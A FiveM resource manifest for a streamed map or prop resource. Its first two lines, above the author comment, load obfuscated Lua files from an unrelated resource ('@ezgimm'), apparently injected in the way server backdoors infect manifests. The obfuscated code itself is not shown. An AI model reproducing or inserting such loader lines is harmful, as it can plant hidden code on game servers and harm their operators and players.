shared_script '@ezgimm/shared_fg-obfuscated.lua'
shared_script '@ezgimm/ai_module_fg-obfuscated.lua'

-- ERDEM & MUSTAFA
fx_version 'bodacious'
games { 'rdr3', 'gta5' }
lua54 'yes'
data_file 'DLC_ITYP_REQUEST' 'stream/ls_quasar_promo.ytyp'
client_scripts {
    'client.lua'
}
escrow_ignore {
    'client.lua'
}
dependency '/assetpacks'